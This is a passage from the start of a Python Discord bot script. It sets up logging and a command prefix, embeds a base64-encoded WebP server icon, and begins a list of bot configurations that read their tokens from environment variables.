import asyncio
import discord
from discord import app_commands
import os
import logging
import base64
from dotenv import load_dotenv

load_dotenv()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

PREFIX = "n!"

SERVER_ICON_B64 = "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"

BOT_CONFIGS = [
    {"name": "bot1", "token_env": "BOT1_TOKEN", "id": 1492845514318676028},
